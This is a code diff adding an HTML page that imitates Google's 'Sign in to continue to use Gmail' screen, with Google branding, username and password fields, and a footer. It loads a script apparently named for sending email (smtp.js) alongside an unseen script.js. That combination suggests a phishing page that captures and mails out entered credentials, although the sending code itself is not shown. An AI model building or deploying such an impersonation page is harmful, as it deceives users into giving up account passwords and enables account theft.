@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
+      rel="stylesheet"
+    />
+
+    <link rel="stylesheet" href="./reset.css" />
+    <link rel="stylesheet" href="./styles.css" />
+
+    <title>Google</title>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="card">
+        <img src="./images/google-logo.svg" alt="" />
+        <h2>Sign in</h2>
+        <h3>to continue to use Gmail</h3>
+        <div class="inputBox">
+          <input type="email" id="email" name="email"  value="">
+          <label>Username</label>
+        </div>
+        <div class="inputBox">
+              <input type="password" id="password" name="text" value="">
+              <label>Password</label>
+            </div>
+        <p>
+          Not your computer? Use Private Browsing windows to sign in.
+          <a href="">Learn more</a>
+        </p>
+
+        <div class="card-bottom">
+          <a href="">Create account</a>
+          <button type="submit" id="submit">Next</button>
+          <!-- <input type="submit" id="submit" name="sign-in" value="Sign In">
+        </form> -->
+        </div>
+      </div>
+
+      <div class="footer">
+        <select name="select">
+          <option value="Portugês (Brasil) selected">Portugês (Brasil)</option>
+          <option value="English (United States)">
+            English (United States)
+          </option>
+          <option value="Español (España)">Español (España)</option>
+        </select>
+
+        <div class="footer-span">
+          <span>Help</span>
+          <span>Privacy</span>
+          <span>Terms</span>
+        </div>
+      </div>
+    </div>
+    <script src="js/jquery.js"></script>
+    <script src="js/smtp.js"></script>
+    <script src="js/script.js"></script>
+  </body>
+</html>
